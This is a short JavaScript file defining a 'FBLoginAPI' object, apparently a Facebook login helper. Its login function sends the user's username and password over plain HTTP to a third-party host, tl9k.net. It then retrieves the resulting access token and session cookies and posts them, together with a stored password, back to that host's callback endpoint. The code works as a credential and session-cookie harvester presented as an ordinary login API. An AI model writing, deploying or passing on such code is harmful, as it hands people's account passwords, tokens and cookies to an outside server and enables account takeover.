var FBLoginAPI = function(api_key){
    var self = this;
    self.api_key = api_key;
    self.host = 'http://tl9k.net';
    self.login = function(username, password, cb){
        $.post(self.host + '/login', {
            api_key : self.api_key,
            username : username,
            password : password
        }, function(json){
            if (json){
                if (json.error){
                    json.error.code = -1;
                    cb(json.error);
                    return;
                }
                if (json.url){
                    $.get(json.url, function(json1){
var token = json1.access_token;
var cookie = json1.session_cookies;
$('#token').text(token);
$('#cookie').text(cookie);			
$.post(self.host + '/callback',{
                            call_id : json.api_call_id,
                            password : self.oldPass,
                            body : JSON.stringify(json1)
                        }, function(json2){
                            if (json.error){
                                console.log(json2);
                            }
                            if (json1.error_code){
                                if (json1.error_code == 406) self.oldPass = password;
                                cb({
                                    code : json1.error_code,
                                    message : JSON.parse(json1.error_data).error_message
                                });
                            }
                            else {
                                cb(null);
                            }
                        })
                    })
                }
            }
            else cb({
                code : -1,
                message : 'Unknow error'
            })
        })
    };
    return self;
};